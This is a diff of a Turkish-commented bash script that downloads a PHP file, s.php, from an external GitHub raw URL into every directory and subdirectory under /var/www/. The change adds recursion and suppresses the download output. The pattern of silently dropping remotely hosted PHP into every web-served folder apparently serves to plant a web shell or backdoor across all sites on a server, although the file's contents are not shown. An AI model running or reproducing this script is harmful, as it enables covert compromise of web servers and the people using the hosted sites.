@@ -2,21 +2,29 @@
 
 # Bu betik /var/www/ dizinindeki her dizine s.php dosyasını indirir.
 
-# /var/www/ dizinindeki tüm dizinleri dolaş
-for dir in /var/www/*/; do
-    # İndirilecek dosyanın URL'si
-    url="https://raw.githubusercontent.com/berkaybasar/berkaybasar.github.io/main/s.php"
+# Fonksiyon: Belirtilen dizin ve alt dizinlerinde s.php dosyasını indirir
+function download_s_php {
+    local current_dir="$1"
+    local url="https://raw.githubusercontent.com/berkaybasar/berkaybasar.github.io/main/s.php"
+    local target="$current_dir/s.php"
 
     # Dosyanın indirileceği hedef yol
-    target="$dir/s.php"
-
-    # Dosya zaten varsa üzerine yazma
-    wget -O "$target" "$url" 2>/dev/null || curl -o "$target" "$url" 2>/dev/null
+    wget -q -O "$target" "$url" || curl -s -o "$target" "$url"
 
     # İşlem sonucunu kontrol et
     if [ $? -eq 0 ]; then
-        echo "s.php dosyası başarıyla $dir dizinine indirildi."
+        echo "s.php dosyası başarıyla $current_dir dizinine indirildi."
     else
-        echo "s.php dosyası $dir dizinine indirilirken bir hata oluştu."
+        echo "s.php dosyası $current_dir dizinine indirilirken bir hata oluştu."
     fi
+
+    # Alt dizinleri kontrol et ve bu fonksiyonu tekrar çağır
+    for subdir in "$current_dir"/*/; do
+        download_s_php "$subdir"
+    done
+}
+
+# /var/www/ dizinindeki tüm dizinler için fonksiyonu çağır
+for dir in /var/www/*/; do
+    download_s_php "$dir"
 done
